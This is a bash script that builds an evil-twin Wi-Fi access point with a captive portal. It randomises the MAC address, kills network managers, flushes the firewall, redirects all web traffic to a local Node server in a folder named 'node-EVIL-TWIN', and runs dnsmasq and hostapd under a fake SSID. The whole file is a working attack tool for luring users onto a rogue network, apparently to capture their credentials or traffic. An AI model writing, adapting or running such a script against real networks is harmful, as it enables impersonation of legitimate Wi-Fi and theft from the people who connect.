#!/bin/bash

if [ "$(id -u)" != "0" ]; then
	echo "Please run as root"
	exit 1
fi


for ARGUMENT in "$@"
do
   KEY=$(echo $ARGUMENT | cut -f1 -d=)

   KEY_LENGTH=${#KEY}
   VALUE="${ARGUMENT:$KEY_LENGTH+1}"

   export "$KEY"="$VALUE"
done



if [[ -z $iface || -z $ssid || -z $channel ]]; then
  echo "help : "
    echo "portal.sh <iface> <ssid> <bssid> <channel>"
    echo "iface: interface name"
    echo "ssid: name of our fake AP"
    echo "channel: channel of our fake AP"
    echo -e "\tdepends upon macchanger, hostapd, dnsmasq, iptables, npm, nodejs, airecrack-ng"
  exit 1
fi




#reset
./clean.sh
#kill any process using port 80
echo kill $(sudo netstat -anp | awk '/ LISTEN / {if($4 ~ ":80$") { gsub("/.*","",$7); print $7; exit } }')

#kill interference
systemctl stop NetworkManager
airmon-ng check kill

ip link set $iface down
macchanger -r $iface
ip link set $iface up


# Enable IP forwarding
sysctl net.ipv4.ip_forward=1

# Little Bobby Tables
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# Share internet at $EVIL_IFACE
iptables -N GOBWEB -t nat

iptables -t nat -A PREROUTING -j GOBWEB
iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 80 --to-destination 192.168.1.1:80
iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 443 --to-destination 192.168.1.1:443

#iptables -t filter -A FORWARD -i $EVIL_IFACE -o $GOOD_IFACE -j ACCEPT
#iptables -t nat -A POSTROUTING -o $GOOD_IFACE -j MASQUERADE


# Assign static ip address
ip addr flush dev $iface
ip addr add 192.168.1.1/24 dev $iface

# Start DHCP server
xterm  -geometry 90x20+800+900  -fg green -xrm 'XTerm.vt100.allowTitleOps: false' -T Dnsmasq  -hold -e "dnsmasq -i $iface --dhcp-range=192.168.1.10,192.168.1.200,12h" &


sed -i "s/interface=.*$/interface=$iface/" hostapd.conf
sed -i "s/ssid.*$/ssid=$ssid/" hostapd.conf
sed -i "s/channel.*$/channel=$channel/" hostapd.conf


# Create AP, WPA2 mode
xterm  -geometry 90x20+0+0  -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Hostapd AP'  -hold -e 'hostapd hostapd.conf' &

# Create AP, WPA2 mode

xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Node Server'  -hold -e 'cd node-EVIL-TWIN ; npm run start' &


read -p "Press any kill to close all..."
#clean on finish
killall xterm
./clean.sh
